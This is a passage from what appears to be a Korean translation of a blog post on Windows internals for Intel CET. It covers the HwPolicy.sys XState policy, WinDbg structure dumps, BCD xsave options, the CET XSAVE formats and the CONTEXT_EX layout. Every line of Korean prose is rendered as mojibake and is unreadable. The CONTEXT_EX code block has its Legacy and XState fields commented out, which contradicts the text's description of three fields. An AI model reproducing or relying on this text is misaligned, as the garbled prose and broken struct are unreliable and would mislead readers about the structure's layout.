í•­ëª©ì„ ì°¾ëŠ”ë‹¤.</p><p>ì´ ì‘ì—…ì€ ë¶€íŒ… ì‹œì— <code>KiInitializeXSave</code>ê°€ í˜¸ì¶œí•˜ëŠ” <code>KiIntersectFeaturesWithPolicy</code> í•¨ìˆ˜ì—ì„œ ìˆ˜í–‰ëœë‹¤. ì´ í•¨ìˆ˜ëŠ” <code>KiLoadPolicyFromImage</code> ë¥¼ í˜¸ì¶œí•˜ì—¬ ì ì ˆí•œ XState ì •ì±…ì„ ë¡œë“œí•˜ê³  <code>KiGetProcessorInformation</code>ì„ í˜¸ì¶œí•˜ì—¬ CPUì˜ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜¨ ë‹¤ìŒ XState êµ¬ì„±ì—ì„œ í˜„ì¬ í™œì„±í™”ëœ ê° ê¸°ëŠ¥ ë¹„íŠ¸ì˜ ìœ íš¨ì„±ì„ <code>KiIsXSaveFeatureAllowed</code> í˜¸ì¶œì„ í†µí•´ í™•ì¸í•œë‹¤.</p><p>ì´ëŸ¬í•œ ê¸°ëŠ¥ì€ <code>HwPolicy.sys</code> ë“œë¼ì´ë²„ì˜ ë¦¬ì†ŒìŠ¤ 101ì—ì„œ ì‘ë™í•˜ë©° êµ¬ì¡°ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_POLICY</span></span><span class="hljs-class">&#123;</span>    ULONG Version;    ULONG Size;    ULONG Flags;    ULONG MaxSaveAreaLength;    ULONGLONG FeatureBitmask;    ULONG NumberOfFeatures;    XSAVE_FEATURE Features[<span class="hljs-number">1</span>];&#125; XSAVE_POLICY, *PXSAVE_POLICY;</code></pre><p>ì˜ˆë¥¼ ë“¤ì–´,  <code>19H1</code> ì‹œìŠ¤í…œì—ì„œ ë¦¬ì†ŒìŠ¤ í•´ì»¤ë¡œ ì¶”ì¶œí•œ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs c">dx @$policy = (_XSAVE_POLICY*)<span class="hljs-number">0x253d0e90000</span>[+<span class="hljs-number">0x000</span>] Version       : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x004</span>] Size          : <span class="hljs-number">0x2fd8</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x008</span>] Flags         : <span class="hljs-number">0x9</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x00c</span>] MaxSaveAreaLength : <span class="hljs-number">0x2000</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x010</span>] FeatureBitmask   : <span class="hljs-number">0x7fffffffffffffff</span> [Type: <span class="hljs-keyword">unsigned</span> __int64][+<span class="hljs-number">0x018</span>] NumberOfFeatures : <span class="hljs-number">0x3f</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x020</span>] Features      [Type: _XSAVE_FEATURE [<span class="hljs-number">1</span>]]</code></pre><p>ê° <code>XSAVE_FEATURE</code>ì— ëŒ€í•´ ê°ê° CPU ê³µê¸‰ ì—…ì²´ ë¬¸ìì—´ì´ ìˆëŠ” <code>XSAVE_VENDOR</code> êµ¬ì¡°ì˜ ë°°ì—´ì„ í¬í•¨í•˜ëŠ” <code>XSAVE_VENDORS</code> êµ¬ì¡°ì— ëŒ€í•œ ì˜¤í”„ì…‹ê³¼ (ì§€ê¸ˆì€ ê°ê° â€œGenuineIntelâ€, â€œAuthenticAMDâ€ ë˜ëŠ” â€œCentaurHaulsâ€) <code>XSAVE_CPU_ERRATA</code> êµ¬ì¡°ì— ëŒ€í•œ ì˜¤í”„ì…‹ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, <code>19H1</code> í…ŒìŠ¤íŠ¸ ì‹œìŠ¤í…œì—ëŠ” ê¸°ëŠ¥ 0ì— ëŒ€í•œ ë‹¤ìŒ ì •ë³´ê°€ ì¡´ì¬í•œë‹¤.</p><pre><code class="hljs c">dx -r4 @$vendor = (XSAVE_VENDORS*)((<span class="hljs-keyword">int</span>)@$policy-&gt;Features[<span class="hljs-number">0</span>].Vendors + <span class="hljs-number">0x253d0e90000</span>)[+<span class="hljs-number">0x000</span>] NumberOfVendors  : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x008</span>] Vendor        [Type: _XSAVE_VENDOR [<span class="hljs-number">1</span>]]    [<span class="hljs-number">0</span>]           [Type: _XSAVE_VENDOR]        [+<span class="hljs-number">0x000</span>] VendorId      [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> [<span class="hljs-number">3</span>]]            [<span class="hljs-number">0</span>]           : <span class="hljs-number">0x756e6547</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [<span class="hljs-number">1</span>]           : <span class="hljs-number">0x49656e69</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [<span class="hljs-number">2</span>]           : <span class="hljs-number">0x6c65746e</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x010</span>] SupportedCpu  [Type: _XSAVE_SUPPORTED_CPU][+<span class="hljs-number">0x000</span>] CpuInfo       [Type: XSAVE_CPU_INFO][+<span class="hljs-number">0x020</span>] CpuErrata     : <span class="hljs-number">0x4c0</span> [Type: XSAVE_CPU_ERRATA *][+<span class="hljs-number">0x020</span>] Unused        : <span class="hljs-number">0x4c0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>ë§ˆì§€ë§‰ìœ¼ë¡œ, ê° <code>XSAVE_CPU_ERRATA</code> êµ¬ì¡°ì²´ëŠ” ì§€ì •ëœ XState ì§€ì›ì— ëŒ€í•œ ì˜¤ë¥˜ ì •ë³´ì™€ ì¼ì¹˜í•˜ëŠ” í”„ë¡œì„¸ì„œ ì •ë³´ ë°ì´í„°ë¥¼ í¬í•¨í•œë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í…ŒìŠ¤íŠ¸ ì‹œìŠ¤í…œì—ì„œ ìœ„ì˜ ì˜¤í”„ì…‹ì—ì„œ ì²« ë²ˆì§¸ ì—ë¼íƒ€ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs c">dx -r3 @$errata = (XSAVE_CPU_ERRATA*)((<span class="hljs-keyword">int</span>)@$vendor-&gt;Vendor[<span class="hljs-number">0</span>].SupportedCpu.CpuErrata + <span class="hljs-number">0x253d0e90000</span>)    [+<span class="hljs-number">0x000</span>] NumberOfErrata   : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x008</span>] Errata           [Type: XSAVE_CPU_INFO [<span class="hljs-number">1</span>]]        [<span class="hljs-number">0</span>]              [Type: XSAVE_CPU_INFO]            [+<span class="hljs-number">0x000</span>] Processor        : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>]            [+<span class="hljs-number">0x002</span>] Family           : <span class="hljs-number">0x6</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x004</span>] Model            : <span class="hljs-number">0xf</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x006</span>] Stepping         : <span class="hljs-number">0xb</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x008</span>] ExtendedModel    : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x00c</span>] ExtendedFamily   : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [+<span class="hljs-number">0x010</span>] MicrocodeVersion : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]            [+<span class="hljs-number">0x018</span>] Reserved         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]</code></pre><p>ëª¨ë“  XState ê¸°ëŠ¥ì— ëŒ€í•œ ì‹œìŠ¤í…œì˜ í•˜ë“œì›¨ì–´ ì •ì±… ë¤í”„ íˆ´ì€ <a href="https://github.com/yardenshafir/cet-research/tree/master/Xpolicy">ì—¬ê¸°</a>ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. ì§€ê¸ˆì€ ì „ì²´ ì •ì±…(ìœ„ì— í‘œì‹œëœ ê²ƒ)ì— í•˜ë‚˜ì˜ ì—ë¼íƒ€ë§Œ ë‚˜íƒ€ë‚œë‹¤.</p><p>ë§ˆì§€ë§‰ìœ¼ë¡œ ë‹¤ìŒ ì˜µì…˜ ë¡œë” ëª…ë ¹ì¤„ ì˜µì…˜(ë° ê° BCD ì„¤ì •)ì„ ì‚¬ìš©í•˜ì—¬ XState ê¸°ëŠ¥ì„ ì¶”ê°€ë¡œ ì»¤ìŠ¤í„°ë§ˆì´ì§•ì´ ê°€ëŠ¥í•˜ë‹¤.</p><ol><li><code>XSAVEPOLICY = n</code> ë¡œë“œ ì˜µì…˜ì€ <code>xsavepolicy</code> BCD ì˜µì…˜ì„ í†µí•´ ì„¤ì •ë˜ë©° <code>KeXSavePolicyId</code>ë¥¼ ì„¤ì •í•˜ì—¬ ë¡œë“œí•  XState ì •ì±…ì„ ë‚˜íƒ€ë‚¸ë‹¤.</li><li><code>XSAVEREMOVEFEATURE = n</code>ë¡œë“œ ì˜µì…˜ì€ <code>xsaveremovefeature</code> BCDì˜µì…˜ì„ í†µí•´ ì„¤ì •ë˜ë©° <code>KeTestRemovedFeatureMask</code> ë¥¼ ì„¤ì •í•œë‹¤. ì´ëŠ” ë‚˜ì¤‘ì— <code>KiInitializeXSave</code>ì— ì˜í•´ êµ¬ë¬¸ ë¶„ì„ë˜ê³  ì§€ì •ëœ ìƒíƒœ ë¹„íŠ¸ë¥¼ ì œê±°í•œë‹¤. ìƒíƒœ 0 (x87 FPU) ë° ìƒíƒœ 1 (SSE)ì€ ì´ ë°©ë²•ìœ¼ë¡œ ì œê±°í•  ìˆ˜ ì—†ë‹¤.</li><li><code>XSAVEDISABLE</code> ë¡œë“œ ì˜µì…˜ì€ <code>xsavedisable</code> BCD ì˜µì…˜ì„ í†µí•´ ì„¤ì •ë˜ì–´ <code>KeTestDisableXsave</code>ë¥¼ ì„¤ì •í•˜ê³  <code>KiInitializeXSave</code>ê°€ ëª¨ë“  XState êµ¬ì„± ë°ì´í„°ë¥¼ 0ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ ì „ì²´ XState ê¸°ëŠ¥ì„ ë¹„í™œì„±í™”í•œë‹¤.</li></ol><h2 id="CET-XSAVE-ì˜ì—­-í¬ë§·"><a href="#CET-XSAVE-ì˜ì—­-í¬ë§·" class="headerlink" title="CET XSAVE ì˜ì—­ í¬ë§·"></a>CET XSAVE ì˜ì—­ í¬ë§·</h2><p>CET êµ¬í˜„ì˜ ì¼í™˜ìœ¼ë¡œ Intelì€ <code>XSTATE_CET_U(11)</code>ì™€ <code>XSTATE_CET_S(12)</code>ë¼ê³  í•˜ëŠ” ë‘ ê°œì˜ ìƒˆë¡œìš´ ë¹„íŠ¸ë¥¼ ì‚¬ìš©ì ë° ìŠˆí¼ë°”ì´ì € ìƒíƒœì— ê°ê° ëŒ€ì‘í•˜ë„ë¡ ì •ì˜í–ˆë‹¤. ì²« ë²ˆì§¸ ìƒíƒœëŠ” <code>XSAVE_CET_U_FORMAT</code>ìœ¼ë¡œ ë¬¸ì„œí™”ëœ 16ë°”ì´íŠ¸ ë°ì´í„° êµ¬ì¡°ë¡œ, <code>IA32_U_CET</code> MSR(<code>Shadow Stack Enable</code> í”Œë˜ê·¸ê°€ êµ¬ì„±ëœ ê²½ìš°) ë° <code>IA32_PL3_SSPMSR</code> (Privile 3 ìˆ˜ì¤€)ì„ í¬í•¨í•œë‹¤. ì•„ì§ MSDN ì •ì˜ê°€ ì—†ëŠ” ë‘ ë²ˆì§¸ ë°©ë²•ì€ <code>IA32_PL0/1/2_SSP</code> MSRì„ í¬í•¨í•œë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_CET_U_FORMAT</span></span><span class="hljs-class">&#123;</span>    ULONG64 Ia32CetUMsr;    ULONG64 Ia32Pl3SspMsr;&#125; XSAVE_CET_U_FORMAT, *PXSAVE_CET_U_FORMAT;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_CET_S_FORMAT</span></span><span class="hljs-class">&#123;</span>    ULONG64 Ia32Pl0SspMsr;    ULONG64 Ia32Pl1SspMsr;    ULONG64 Ia32Pl2SspMsr;&#125; XSAVE_CET_S_FORMAT, *PXSAVE_CET_S_FORMAT;</code></pre><p>í•„ë“œ ì´ë¦„ì—ì„œ ì•Œ ìˆ˜ ìˆë“¯ì´ CET ê´€ë ¨ ë ˆì§€ìŠ¤í„°ëŠ” ì‹¤ì œë¡œ ê° MSRì— ì €ì¥ëœ ê°’ì´ë©°, ì¼ë°˜ì ìœ¼ë¡œ Ring 0ì˜ RDMSR ë° WRMSR ê¶Œí•œì´ ìˆëŠ” ëª…ë ¹ì„ í†µí•´ì„œë§Œ ì•¡ì„¸ìŠ¤ í•  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë‚˜ í”„ë¡œì„¸ì„œ ì „ì—­ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ëŒ€ë¶€ë¶„ì˜ MSRê³¼ ë‹¬ë¦¬ CETëŠ” ìŠ¤ë ˆë“œ ë‹¨ìœ„ë¡œ í™œì„±í™”í•  ìˆ˜ ìˆìœ¼ë©° Shadow stack pointerë„ ìŠ¤ë ˆë“œ ë‹¨ìœ„ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ì´ìœ ë¡œ CET ê´€ë ¨ ë°ì´í„°ëŠ” ìš´ì˜ ì²´ì œê°€ ìŠ¤ë ˆë“œ ìŠ¤ìœ„ì¹˜ë¥¼ ì˜¬ë°”ë¥´ê²Œ ì²˜ë¦¬í•  ìˆ˜ ìˆë„ë¡ XState ê¸°ëŠ¥ì˜ ì¼ë¶€ë¡œ êµ¬í˜„ë˜ì–´ì•¼ í•œë‹¤.</p><p>CET ë ˆì§€ìŠ¤í„°ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì»¤ë„ ì½”ë“œë¡œë§Œ ìˆ˜ì • ê°€ëŠ¥í•œ MSRì´ê¸° ë•Œë¬¸ì— <code>CPL3 XSAVE/XRSTOR</code> ëª…ë ¹ì„ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë©° ê°ê°ì˜ ìƒíƒœ ë¹„íŠ¸ëŠ” <code>IA32_XSS</code> MSRì—ì„œ í•­ìƒ 1ë¡œ ì„¤ì •ëœë‹¤. ê·¸ëŸ¬ë‚˜ ìš´ì˜ì²´ì œê°€ ìœ ì € ëª¨ë“œì˜ ì½”ë“œê°€ SSPë¥¼ ìˆ˜ì •í•˜ëŠ” ê²ƒì„ ì™„ì „íˆ ì°¨ë‹¨í•  ìˆ˜ëŠ” ì—†ë‹¤. ìœ ì € ëª¨ë“œì˜ ì½”ë“œëŠ” ì˜ˆì™¸ ì²˜ë¦¬, unwinding, jmp/longjmp ë˜ëŠ” Windowsì˜ <code>Fiber</code> ë©”ì»¤ë‹ˆì¦˜ê³¼ ê°™ì€ íŠ¹ì • ê¸°ëŠ¥ì„ ì‚¬ìš©í•´ SSPë¥¼ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆë‹¤.</p><p>ë”°ë¼ì„œ Windowsê°€ CS ë° DR7ê³¼ ê°™ì€ íŠ¹ì • ë³´í˜¸ëœ CPU ë ˆì§€ìŠ¤í„°ë¥¼ ì—…ë°ì´íŠ¸í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext</a>ë¥¼ ì œê³µí•˜ëŠ” ê²ƒì²˜ëŸ¼ ìš´ì˜ ì²´ì œëŠ” ìŠ¤ë ˆë“œê°€ ì‹œìŠ¤í…œ í˜¸ì¶œì„ í†µí•´ XSateì—ì„œ CET ìƒíƒœë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì œê³µí•´ì•¼ í•œë‹¤. ë”°ë¼ì„œ ë‹¤ìŒ ì„¹ì…˜ì—ì„œëŠ” XState ê´€ë ¨ ì •ë³´ë¥¼ ì§€ì›í•˜ê¸° ìœ„í•´ í˜„ëŒ€ì˜ Windows ë²„ì „ì—ì„œ <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-wow64_context">CONTEXT</a> êµ¬ì¡°ê°€ CONTEXT_EX êµ¬ì¡°ë¡œ ì–´ë–»ê²Œ ë°œì „í–ˆëŠ”ì§€, ê·¸ë¦¬ê³  ì˜ˆì™¸ ê´€ë ¨ ì‹œë‚˜ë¦¬ì˜¤ì— ëŒ€í•´ CET ê´€ë ¨ ì²˜ë¦¬ë¥¼ ì¶”ê°€í•˜ëŠ” ë™ì‹œì— ì†ìƒëœ CONTEXTë¥¼ í†µí•œ ì•…ì˜ì ì¸ ì œì–´ íë¦„ ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ì„œ ì•Œì•„ë³¸ë‹¤.</p><h1 id="CONTEXT-EX-ë‚´ë¶€"><a href="#CONTEXT-EX-ë‚´ë¶€" class="headerlink" title="CONTEXT_EX ë‚´ë¶€"></a>CONTEXT_EX ë‚´ë¶€</h1><p>ì½˜í…ìŠ¤íŠ¸ ìŠ¤ìœ„ì¹˜ë¥¼ í•  ë•Œ ì €ì¥í•´ì•¼ í•˜ëŠ” ë ˆì§€ìŠ¤í„°ì˜ ìˆ˜ê°€ ì ì  ëŠ˜ì–´ë‚˜ê³ , ì´ë¥¼ ì§€ì›í•˜ê¸° ìœ„í•´ ìƒˆë¡œìš´ ë²„ì „ì˜ WindowsëŠ” ë ˆê±°ì‹œ CONTEXT êµ¬ì¡° ì™¸ì—ë„ CONTEXT_EX êµ¬ì¡°ë¥¼ ë„ì…í–ˆë‹¤. CONTEXT_EXëŠ” ë ˆê±°ì‹œ CONTEXTê°€ ê³ ì • í¬ê¸°ì¸ ë°˜ë©´ XSAVEëŠ” ìŠ¤ë ˆë“œ, í”„ë¡œì„¸ì„œ ë° ì‹œìŠ¤í…œ êµ¬ì„± ì •ì±…ì— ë”°ë¼ ë™ì ìœ¼ë¡œ í¬ê¸°ê°€ ì¡°ì •ë˜ëŠ” í”„ë¡œì„¸ì„œ ìƒíƒœ êµ¬ì¡°ê°€ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ë„ì…ë˜ì—ˆë‹¤.</p><h2 id="CONTEXT-EX-êµ¬ì¡°"><a href="#CONTEXT-EX-êµ¬ì¡°" class="headerlink" title="CONTEXT_EX êµ¬ì¡°"></a>CONTEXT_EX êµ¬ì¡°</h2><p>CONTEXT_EXëŠ” í˜„ì¬ ì»¤ë„ ë° ìœ ì € ëª¨ë“œ ì˜ˆì™¸ ì²˜ë¦¬ ê¸°ëŠ¥ ì „ì²´ì—ì„œ ì‚¬ìš©ë˜ì§€ë§Œ CONTEXT_EX êµ¬ì¡°ì˜ ëŒ€ë¶€ë¶„ì€ ë¬¸ì„œí™”ë˜ì§€ ì•Šì•˜ë‹¤. Windows 7 í—¤ë” íŒŒì¼ ë° ì¼ë¶€ intelì˜ reference codeì— ì¡´ì¬í•˜ëŠ” ì¼ë¶€ ì •ë³´ê°€ ì‹¤ìˆ˜ë¡œ ê³µê°œë˜ì§€ ì•Šë„ë¡ í–ˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. ë‹¤ìŒ ì½”ë“œì˜ ì£¼ì„ì„ ë³´ê³  ì´í•´í•  ìˆ˜ ìˆëŠ” ê²ƒì´ ìˆìœ¼ë©´ ì•Œë ¤ì£¼ì—ˆìœ¼ë©´ í•œë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">//</span><span class="hljs-comment">// ì´ êµ¬ì¡°ì²´ëŠ” CONTEXT_EXì˜ ë‹¨ì¼ ì²­í¬ í¬ê¸°ì™€ ì˜¤í”„ì…‹(CONTEXT_EX êµ¬ì¡° ì‹œì‘ë¶€í„°)ì„ ì§€ì •í•œë‹¤.</span><span class="hljs-comment">// N.B. ì˜¤í”„ì…‹ì€ ìŒìˆ˜ì¼ ìˆ˜ ìˆë‹¤.</span><span class="hljs-comment">//</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT_CHUNK</span></span><span class="hljs-class">&#123;</span>    LONG Offset;    DWORD Length;&#125; CONTEXT_CHUNK, *PCONTEXT_CHUNK;<span class="hljs-comment">// CONTEXT_EX êµ¬ì¡°ì²´ëŠ” ëŠ” CONTEXT êµ¬ì¡°ì²´ì˜ í™•ì¥ì´ë‹¤. </span><span class="hljs-comment">// ì½˜í…ìŠ¤íŠ¸ ë ˆì½”ë“œë¥¼ í”„ë¡œì„¸ì„œ ìƒíƒœì˜ ì¼ë¶€ë¥¼ í¬í•¨í•˜ëŠ” ë¶„ë¦¬ëœ ê°€ë³€í¬ê¸° ë²„í¼(ì²­í¬) ì„¸íŠ¸ë¡œ </span><span class="hljs-comment">// ì •ì˜í•œë‹¤. í˜„ì¬ ë‘ ê°œì˜ ë²„í¼(ì²­í¬)ë§Œ ì •ì˜ëœë‹¤:</span><span class="hljs-comment">//</span><span class="hljs-comment">// - ê¸°ì¡´ CONTEXT êµ¬ì¡°ë¥¼ ì €ì¥í•˜ëŠ” ë ˆê±°ì‹œ</span><span class="hljs-comment">// - XSAVE ì €ì¥ ì˜ì—­ ë²„í¼ë¥¼ ì €ì¥í•˜ëŠ” XState</span><span class="hljs-comment">// XSAVE_AREA_HEADER, i.e. without the first 512 bytes.</span><span class="hljs-comment">//</span><span class="hljs-comment">// PCONTEXT í¬ì¸í„°ë¥¼ PCONTEXT_EX í¬ì¸í„°ë¡œ ë³€í™˜í•˜ëŠ” ëª‡ ê°€ì§€ ê°€ì •ì´ ìˆë‹¤.</span><span class="hljs-comment">//</span><span class="hljs-comment">// 1. PCONTEXT í¬ì¸í„°ì™€ í•¨ê»˜ ì‘ë™í•˜ëŠ” APIëŠ” CONTEXT_EXê°€ CONTEXT êµ¬ì¡° ë°”ë¡œ ë’¤ì— ì €ì¥ëœë‹¤ê³  ê°€ì •</span><span class="hljs-comment">//    ë˜í•œ CONTEXT_EXëŠ” í•´ë‹¹ CONTEXT_XXX í”Œë˜ê·¸ê°€ CONTEXT.ContextFlagsì— ì„¤ì •ëœ ê²½ìš°ì—ë§Œ ì¡´ì¬í•œë‹¤ê³  ê°€ì •</span><span class="hljs-comment">//</span><span class="hljs-comment">// 2. CONTEXT_EX êµ¬ì¡°ê°€ ìˆìœ¼ë©´ ë ˆê±°ì‹œê°€ í•­ìƒ ì¡´ì¬</span><span class="hljs-comment">//</span><span class="hljs-comment">// 3. CONTEXT.ContextFlagsëŠ” ì¡´ì¬í•˜ëŠ” ì²­í¬ë¥¼ ì •ì˜</span><span class="hljs-comment">//    ì¦‰ CONTEXT_XSTATEê°€ ì„¤ì •ëœ ê²½ìš° CONTEXT_EX.XStateê°€ ìœ íš¨í•˜ë‹¤.</span><span class="hljs-comment">//</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT_EX</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">// ì˜¤í”„ì…‹ì´ ê°€ì¥ ì‘ì€ ì²­í¬ì—ì„œ ì‹œì‘í•˜ëŠ” êµ¬ì¡°ì²´ì˜ ì´ í¬ê¸°</span>    <span class="hljs-comment">// N.B. ì˜¤í”„ì…‹ì€ ìŒìˆ˜ì¼ ìˆ˜ ìˆë‹¤.</span>    <span class="hljs-comment">//</span>    CONTEXT_CHUNK All;    <span class="hljs-comment">// </span>    <span class="hljs-comment">// ê¸°ì¡´ì˜ CONTEXT êµ¬ì¡° wrapper</span>    <span class="hljs-comment">// N.B. ì²­í¬ì˜ í¬ê¸°ëŠ” sizeof(CONTEXT) ë³´ë‹¤ ì‘ì„ ìˆ˜ ìˆë‹¤.</span>    <span class="hljs-comment">// (CONTEXT_EXTENDED_REGISTERSê°€ x86ì— ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°).    </span><span class="hljs-comment">// CONTEXT_CHUNK Legacy;</span>    <span class="hljs-comment">//</span>  <span class="hljs-comment">// CONTEXT_XSTATE : í™•ì¥ëœ í”„ë¡œì„¸ì„œ ìƒíƒœ ì²­í¬. ìƒíƒœ ì €ì¥ì€ ë™ì¼í•œ í˜•ì‹ </span>  <span class="hljs-comment">// XSAVE ì‘ì—…ì€ ì²˜ìŒ 512 ë°”ì´íŠ¸ë¥¼ ì œì™¸í•˜ê³  XSAVE_AREA_HEADERì—ì„œ ì‹œì‘í•œë‹¤. </span><span class="hljs-comment">// FP ë° SSE ìƒíƒœì— í•´ë‹¹í•˜ëŠ” í•˜ìœ„ 2 ë¹„íŠ¸ëŠ” 0ì´ì–´ì•¼ í•œë‹¤.</span>    <span class="hljs-comment">// CONTEXT_CHUNK XState;</span>&#125; CONTEXT_EX, *PCONTEXT_EX;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CONTEXT_EX_LENGTH ALIGN_UP_BY(sizeof(CONTEXT_EX), STACK_ALIGN)</span><span class="hljs-comment">//</span><span class="hljs-comment">// ì´ ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•´ ì½˜í…ìŠ¤íŠ¸ ì²­í¬ë¥¼ ë” ì‰½ê²Œ ì¡°ì‘ ê°€ëŠ¥</span><span class="hljs-comment">//</span></code></pre><p>ë”°ë¼ì„œ ì´ í—¤ë”ë¡œ CONTEXT_EX êµ¬ì¡°ì˜ ë ˆì´ì•„ì›ƒì„ ì´í•´í•˜ê³  ì‹œê°í™”í•  ìˆ˜ ìˆì„ ë•Œê¹Œì§€ ì—¬ëŸ¬ ì°¨ë¡€ ì‹œë„ë¥¼ í–ˆê³  ë‹¤ìŒ ë‹¤ì´ì–´ê·¸ë¨ì´ ë„ì›€ì´ ë  ìˆ˜ ìˆë‹¤ê³  ëŠê¼ˆë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/4.png"></p><p>ë‹¤ì´ì–´ê·¸ë¨ì—ì„œ CONTEXT_EX êµ¬ì¡°ëŠ” í•­ìƒ CONTEXT êµ¬ì¡°ì˜ ëì— ìˆìœ¼ë©° ë ˆê±°ì‹œ ë° XStateë¼ëŠ” <code>CONTEXT_CHUNK</code> ìœ í˜•ì˜ 3ê°œ í•„ë“œê°€ ìˆë‹¤. ì´ë“¤ì€ ì˜¤í”„ì…‹ê³¼ ë°ì´í„°ì˜ í¬ê¸°ë¥¼ ì •ì˜í•˜ê³  ì ì ˆí•œ ë°ì´í„° í¬ì¸í„°ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•œ ë‹¤ì–‘í•œ <code>RTL_</code> ë§¤í¬ë¡œê°€ ì¡´ì¬í•œë‹¤.</p><p>Legacy í•„ë“œëŠ” ê¸°ì¡´ CONTEXT êµ¬ì¡°ì˜ ì‹œì‘ì„ ì°¸ì¡°í•œë‹¤. (<code>CONTEXT_EXTENDED_REGISTERS</code>ê°€ ì œê³µë˜ì§€ ì•Šìœ¼ë©´ x86ì—ì„œ í¬ê¸°ê°€ ë” ì‘ì„ ìˆ˜ ìˆìŒ) <code>All</code> í•„ë“œëŠ” ê¸°ì¡´ CONTEXT êµ¬ì¡°ì˜ ì‹œì‘ì„ ì°¸ì¡°í•˜ì§€ë§Œ LengthëŠ” CONTEXT_EXì™€ XSAVE ì˜ì—­ì— í•„ìš”í•œ íŒ¨ë”©/ì •ë ¬ ê³µê°„ì„ í¬í•¨í•˜ì—¬ ëª¨ë“  ë°ì´í„°ì˜ í¬ê¸°ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ <code>XState</code> í•„ë“œëŠ” <code>XSAVE_AREA_HEADER</code> êµ¬ì¡° (ìƒíƒœ ë¹„íŠ¸ê°€ í™œì„±í™”ë˜ì–´ ë°ì´í„°ê°€ ìˆëŠ” ìƒíƒœ ë§ˆìŠ¤í¬ë¥¼ ì •ì˜í•¨)ì™€ ì „ì²´ XSAVE ì˜ì—­ì˜ í¬ê¸°ë¥¼ ì°¸ì¡°í•œë‹¤. ì´ ë ˆì´ì•„ì›ƒìœ¼ë¡œ ì¸í•´ All ë° Legacyì—ëŠ” ìŒìˆ˜ ì˜¤í”„ì…‹ì´ ì ìš©ëœë‹¤ëŠ” ì ì— ìœ ì˜í•´ì•¼ 